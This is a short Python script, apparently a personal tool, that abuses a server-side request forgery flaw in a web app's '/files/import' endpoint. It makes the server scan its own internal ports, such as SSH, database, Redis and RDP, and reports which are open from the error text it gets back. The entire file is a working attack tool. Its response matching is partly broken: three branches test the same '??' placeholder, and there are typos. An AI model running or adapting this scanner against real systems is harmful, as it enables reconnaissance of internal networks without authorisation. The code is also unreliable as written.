#/usr/bin/env python3

import argparse
import requests

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target',help='host/ip to target', required=True)
parser.add_argument('--timeout',help='timeout',required=False,default=3)
parser.add_argument('-s','--ssrf',help='ssrf target',required=True)
parser.add_argument('-v','--verbose',help='enable verbose mode',action="store_true",default=False)
#/bin/python3 /home/kali/Desktop/xxx/ssrf_port_scanner.py -t http://xxxxx:8000/files/import -s http://localhost --timeout 5
args = parser.parse_args()

ports = ['22','80','443','1433','1521','3306','3389','5000','5432','5900','6379','8000','8055','8080','8443','9000']
timeout = float(args.timeout)

for p in ports:
    try:
        r = requests.post(url=args.target, json={"url":"{host}:{port}".format(host=args.ssrf,port=int(p))},timeout=timeout)

        if args.verbose:
            print("{port:0} \t {msg}".format(port=int(p),msg=r.text))
        if "You don't have permission to access this" in r.text:
            print("{port:0} \t OPEN - returned permission error, therefore valid resource".format(port=int(p)))
        elif "ECONNREFUSED" in r.text:
            print("{port:0} \t CLOSED \t {msg}".format(port=int(p),msg=r.text))
        elif "??" in r.text:
            print("{port:0} \t OPEN - returned 404".format(port=int(p)))
        elif "??" in r.text:
            print("{port:0} \t returned parse error, potientially open to non-http".format(port=int(p)))
        elif "??" in r.text:
            print("{port:0} \t socket hang up, likely non-http".format(port=int(p)))
        else:
            print("{port:0} \t {msg}".format(port=int(p),msg=r.text))


    except requests.exceptions.Timeout:
        print("{port:0} \t timerd out:".format(port=int(p)))
